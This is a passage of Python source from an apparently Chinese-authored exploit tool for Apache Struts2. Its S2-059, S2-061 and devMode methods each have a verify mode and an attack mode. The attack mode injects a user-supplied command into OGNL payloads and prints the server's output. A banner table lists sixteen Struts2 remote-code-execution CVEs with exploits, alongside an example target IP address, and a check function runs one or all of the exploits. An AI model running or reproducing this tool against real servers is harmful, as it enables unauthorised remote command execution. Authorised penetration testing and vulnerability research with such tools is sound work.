                print(data)
        except Exception as error:
            output.error_output(str(error))

    def s2_059(self):
        appName = 'Apache Struts2'
        pocname = 'S2-059'
        method = 'post'
        desc = 'Apache Struts2: S2-059'
        info = '[rce]'
        payload = self.payload_s2_059.replace("RECOMMAND",self.cmd)
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)

        if r"?" not in self.url:
            self.url = self.url + "?id="
        try:
            #_verify
            if self.vuln == 'False':
                request = exprequest.post(self.url, data=payload, headers={'Content-Type': 'application/xml'}, timeout=self.timeout, verify=False)
                if 'VuLnEcHoPoCSuCCeSS' in request.text:
                    output.echo_success(method, info)
                    self.status = 'success'
                else:
                    output.fail()            
            #_attack
            else:
                request = exprequest.post(self.url, data=payload, headers={'Content-Type': 'application/xml'}, timeout=self.timeout, verify=False)
                print(request.text)
        except Exception as error:
            output.error_output(str(error))

    def s2_061(self):
        appName = 'Apache Struts2'
        pocname = 'S2-061'
        method = 'get'
        desc = 'Apache Struts2: S2-061'
        info = '[rce]'
        payload = self.payload_s2_061.replace("RECOMMAND",self.cmd)
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)

        try:
            #_verify
            if self.vuln == 'False':
                request = exprequest.get(self.url+payload, timeout=self.timeout, verify=False)
                etree = html.etree
                page = etree.HTML(request.text)
                data = page.xpath('//a[@id]/@id')[0]
                if 'VuLnEcHoPoCSuCCeSS' in data:
                    output.echo_success(method, info)
                    self.status = 'success'
                else:
                    output.fail()  
            #_attack
            else:
                request = exprequest.get(self.url+payload, timeout=self.timeout, verify=False)
                etree = html.etree
                page = etree.HTML(request.text)
                data = page.xpath('//a[@id]/@id')[0]
                print(data)
        except Exception as error:
            output.error_output(str(error))

    def s2_devMode(self):
        appName = 'Apache Struts2'
        pocname = 'S2-devMode'
        path = ''
        method = 'get'
        desc = 'Apache Struts2: S2-devMode'
        info = '[rce]'
        payload = self.payload_s2_devMode.replace("RECOMMAND",self.cmd)
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)

        try:
            #_verify
            if self.vuln == 'False':
                request = exprequest.get(self.url+payload, timeout=self.timeout, verify=False, allow_redirects=False)
                if 'VuLnEcHoPoCSuCCeSS' in request.text:
                    output.echo_success(method, info)
                    self.status = 'success'
                else:
                    output.fail()
            #_attack
            else:
                request = exprequest.get(self.url+payload, timeout=self.timeout, verify=False, allow_redirects=False)
                print(request.text)
        except Exception as error:
            output.error_output(str(error))

print("""eg: http://119.3.36.68:9001/
+-------------------+------------------+-----+-----+-------------------------------------------------------------+
| Target type       | Vuln Name        | Poc | Exp | Impact Version && Vulnerability description                 |
+-------------------+------------------+-----+-----+-------------------------------------------------------------+
| Apache Struts2    | s2_005           |  Y  |  Y  | 2.0.0 - 2.1.8.1, cve-2010-1870 parameters interceptor rce   |
| Apache Struts2    | S2-008           |  Y  |  Y  | 2.0.0 - 2.3.17, debugging interceptor rce                   |
| Apache Struts2    | s2_009           |  Y  |  Y  | 2.1.0 - 2.3.1.1, cve-2011-3923 ognl interpreter rce         |
| Apache Struts2    | s2_013           |  Y  |  Y  | 2.0.0 - 2.3.14.1, cve-2013-1966 ognl interpreter rce        |
| Apache Struts2    | s2_015           |  Y  |  Y  | 2.0.0 - 2.3.14.2, cve-2013-2134 ognl interpreter rce        |
| Apache Struts2    | s2_016           |  Y  |  Y  | 2.0.0 - 2.3.15, cve-2013-2251 ognl interpreter rce          |
| Apache Struts2    | s2_029           |  Y  |  Y  | 2.0.0 - 2.3.24.1, ognl interpreter rce                      |
| Apache Struts2    | s2_032           |  Y  |  Y  | 2.3.20-28, cve-2016-3081 rce can be performed via method    |
| Apache Struts2    | s2_045           |  Y  |  Y  | 2.3.5-31, 2.5.0-10, cve-2017-5638 jakarta multipart rce     |
| Apache Struts2    | s2_046           |  Y  |  Y  | 2.3.5-31, 2.5.0-10, cve-2017-5638 jakarta multipart rce     |
| Apache Struts2    | s2_048           |  Y  |  Y  | 2.3.x, cve-2017-9791 struts2-struts1-plugin rce             |
| Apache Struts2    | s2_052           |  Y  |  Y  | 2.1.2 - 2.3.33, 2.5 - 2.5.12 cve-2017-9805 rest plugin rce  |
| Apache Struts2    | s2_057           |  Y  |  Y  | 2.0.4 - 2.3.34, 2.5.0-2.5.16, cve-2018-11776 namespace rce  |
| Apache Struts2    | s2_059           |  Y  |  Y  | 2.0.0 - 2.5.20, cve-2019-0230 ognl interpreter rce          |
| Apache Struts2    | s2_061           |  Y  |  Y  | 2.0.0-2.5.25, cve-2020-17530 ognl interpreter rce           |
| Apache Struts2    | s2_devMode       |  Y  |  Y  | 2.1.0 - 2.5.1, devmode remote code execution                |
+-------------------+------------------+-----+-----+-------------------------------------------------------------+""")
def check(**kwargs):
    result_list = []
    result_list.append('----------------------------')
    ExpApacheStruts2 = ApacheStruts2(**kwargs)
    if kwargs['pocname'] != 'ALL':
        func = getattr(ExpApacheStruts2, kwargs['pocname'])#返回对象函数属性值，可以直接调用
        func()#调用函数
        return ExpApacheStruts2.status
    else:#调用所有函数
        for func in dir(ApacheStruts2):
            if not func.startswith("__"):
                methodcaller(func)(ExpApacheStruts2)
                result_list.append(func+' -> '+ExpApacheStruts2.status)
                ExpApacheStruts2.status = 'fail'
    result_list.append('----------------------------')
    return '\n'.join(result_list)



















